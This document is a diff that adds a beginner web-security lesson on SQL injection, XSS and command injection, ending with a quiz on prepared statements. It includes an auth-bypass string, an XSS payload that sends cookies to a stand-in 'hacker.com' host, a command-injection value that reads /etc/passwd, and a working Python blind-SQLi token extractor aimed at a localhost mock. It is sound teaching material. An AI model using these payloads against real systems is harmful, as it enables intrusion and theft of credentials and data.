@@ -1,0 +1,126 @@
+---
+title: "Web Vulnerabilities I"
+day: 9
+phase: 1
+topic: "SQLi, XSS, Command Injection"
+difficulty: "Beginner"
+---
+
+# Day 9: Web Vulnerabilities I - SQL Injection, XSS & Command Exploits
+
+The web is the primary entry point for modern corporate environments. Today, we dive deep into the mechanics of three high-severity web exploits: SQL Injection (SQLi), Cross-Site Scripting (XSS), and Command Injection, and write an automated script to extract remote database schemas.
+
+---
+
+## 1. SQL Injection (SQLi) & Blind Exfiltration
+
+**SQL Injection** occurs when unsanitized user inputs are concatenated directly into database query strings instead of using parameterization.
+
+```
+Concatenated Query:
+"SELECT * FROM users WHERE username = '" + userInput + "' AND password = '...'"
+
+If userInput is: admin' OR '1'='1
+The resulting query becomes:
+"SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '...'"
+```
+
+Since `'1'='1'` is always true, the database bypasses password authentication completely and logs the attacker in as the admin user!
+
+### Blind SQL Injection (Boolean-Based)
+When an application is vulnerable to SQL injection but does not return any query outputs on the screen, we must use **Blind SQL Injection**. We ask the database True/False questions based on logical statements:
+```sql
+-- Is the first character of the admin password 'a'?
+admin' AND SUBSTRING(password, 1, 1) = 'a' --
+```
+If the webpage loads normally (True), we know the character is 'a'. If it returns an error or loads differently (False), we try another character. By repeating this process, we can extract entire databases, character by character!
+
+---
+
+## 2. Cross-Site Scripting (XSS)
+
+**Cross-Site Scripting** occurs when an application receives untrusted data and displays it on a webpage without proper sanitization, allowing malicious JavaScript to execute in a victim's browser.
+
+```
+Malicious Payload Input: <script>fetch('http://hacker.com/steal?cookie=' + document.cookie)</script>
+```
+
+### XSS Types:
+1. **Stored XSS (Persistent):** The payload is stored in a database (e.g., a forum comment) and executed every time users view that comment.
+2. **Reflected XSS (Non-Persistent):** The payload is reflected off the server via a URL parameter (e.g., a search field `?q=<script>...`). It executes only when a victim clicks on that custom link.
+3. **DOM-Based XSS:** The vulnerability exists entirely in the client-side JavaScript, which parses URL data and writes it directly to the document object model (DOM) without sanitization.
+
+---
+
+## 3. Command Injection
+
+**Command Injection** occurs when user input is passed directly to a system shell execution function (like `system()` in C, or `child_process.exec()` in Node.js) without sanitization.
+
+```
+Vulnerable backend code (pings an IP address):
+system("ping -c 3 " + userInput);
+
+If userInput is: 127.0.0.1 ; cat /etc/passwd
+The shell executes:
+ping -c 3 127.0.0.1 ; cat /etc/passwd
+```
+
+The semicolon `;` terminates the ping command, allowing the system to execute the secondary `cat` command and leak sensitive server files.
+
+---
+
+## 4. Field Portfolio Project: Python Boolean-Based Blind SQLi Harvester
+
+Let's build an automated security auditing script in Python that extracts a database administrator's secret token using Boolean-Based Blind SQL injection queries against a mock endpoint.
+
+### Step 1: Create the Automated Exploit Script
+Create a file named `blind_sqli.py`:
+```python
+import requests
+import sys
+
+# Simulated target URL vulnerable to blind SQLi
+TARGET_URL = "http://localhost:3000/api/vulnerabilities/sqli"
+
+def run_exploit():
+    print("[*] Starting Boolean-Based Blind SQLi exfiltration...")
+    extracted_string = ""
+    characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
+
+    # Let's extract a 10-character token
+    for position in range(1, 11):
+        for char in characters:
+            # Construct injection payload: admin' AND SUBSTRING(token, pos, 1) = 'char
+            payload = f"admin' AND SUBSTRING(token, {position}, 1) = '{char}' --"
+            params = {"user": payload}
+
+            try:
+                r = requests.get(TARGET_URL, params=params)
+                # If "Welcome back admin" is in the response, our query evaluated to TRUE!
+                if "Welcome back admin" in r.text:
+                    extracted_string += char
+                    print(f"[+] Character found at position {position}: {char} -> Current Token: {extracted_string}")
+                    break
+            except Exception as e:
+                print(f"[-] Request failed: {e}")
+                sys.exit(1)
+
+    print(f"[!] EXFILTRATION COMPLETE: Extracted Database Token: {extracted_string}")
+
+if __name__ == "__main__":
+    run_exploit()
+```
+
+This automated scraper teaches you how complex automated exploitation frameworks (like SQLMap) interact with databases at the lower layer!
+
+---
+
+### Challenge: SQL Injection Defense
+What is the primary, industry-standard secure programming technique used to eliminate SQL Injection vulnerabilities by pre-compiling SQL query templates and treating inputs strictly as parameters?
+
+<Challenge
+  id="day-9-sqli"
+  type="input"
+  correctAnswer="Prepared Statements"
+  placeholder="Enter security technique..."
+/>
